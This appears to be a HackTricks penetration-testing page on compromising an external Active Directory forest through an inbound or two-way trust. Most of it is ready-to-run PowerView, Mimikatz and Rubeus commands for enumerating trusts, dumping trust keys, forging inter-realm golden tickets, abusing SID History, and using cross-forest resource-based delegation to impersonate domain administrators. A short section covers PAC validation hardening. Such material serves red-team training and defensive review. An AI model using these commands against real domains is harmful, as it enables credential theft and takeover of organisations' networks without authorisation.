# External Forest Domain - OneWay (Inbound) or bidirectional

{{#include ../../banners/hacktricks-training.md}}

In this scenario an external domain is trusting you (or both are trusting each other), so you can get some kind of access over it.

## Enumeration

First of all, you need to **enumerate** the **trust**:

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
                          DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.

# Additional trust hygiene checks (AD RSAT / AD module)
Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
```

> `SelectiveAuthentication`/`SIDFiltering*` let you quickly see if cross-forest abuse paths (RBCD, SIDHistory) are likely to work without extra prerequisites.

In the previous enumeration it was found that the user **`crossuser`** is inside the **`External Admins`** group who has **Admin access** inside the **DC of the external domain**.

## Initial Access

If you **couldn't** find any **special** access of your user in the other domain, you can still go back to the AD Methodology and try to **privesc from an unprivileged user** (things like kerberoasting for example):

You can use **Powerview functions** to **enumerate** the **other domain** using the `-Domain` param like in:

```bash
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```


{{#ref}}
./
{{#endref}}

## Impersonation

### Logging in

Using a regular method with the credentials of the users who is has access to the external domain you should be able to access:

```bash
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```

### SID History Abuse

You could also abuse [**SID History**](sid-history-injection.md) across a forest trust.

If a user is migrated **from one forest to another** and **SID Filtering is not enabled**, it becomes possible to **add a SID from the other forest**, and this **SID** will be **added** to the **user's token** when authenticating **across the trust**.

> [!WARNING]
> As a reminder, you can get the signing key with
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
> ```

You could **sign with** the **trusted** key a **TGT impersonating** the user of the current domain.

```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```

### Full way impersonating the user

```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```

### Cross-forest RBCD when you control a machine account in the trusting forest (no SID filtering / selective auth)

If your foreign principal (FSP) lands you in a group that can write computer objects in the trusting forest (e.g., `Account Operators`, custom provisioning group), you can configure **Resource-Based Constrained Delegation** on a target host of that forest and impersonate any user there:

```bash
# 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
# 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
Set-ADComputer -Identity victim-host$ -PrincipalsAllowedToDelegateToAccount MYLAB$
# or with PowerView
Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sidbytes_of_MYLAB}

# 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
```

This only works when **SelectiveAuthentication is disabled** and **SID filtering** does not strip your controlling SID. It is a fast lateral path that avoids SIDHistory forging and is often missed in trust reviews.

### PAC validation hardening

PAC signature validation updates for **CVE-2024-26248**/**CVE-2024-29056** add signing enforcement on inter-forest tickets. In **Compatibility mode**, forged inter-realm PAC/SIDHistory/S4U paths can still work on unpatched DCs. In **Enforcement mode**, unsigned or tampered PAC data crossing a forest trust is rejected unless you also hold the target forest trust key. Registry overrides (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`) can weaken this while they remain available.



## References

- [Microsoft KB5037754 – PAC validation changes for CVE-2024-26248 & CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
- [MS-PAC spec – SID filtering & claims transformation details](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
{{#include ../../banners/hacktricks-training.md}}
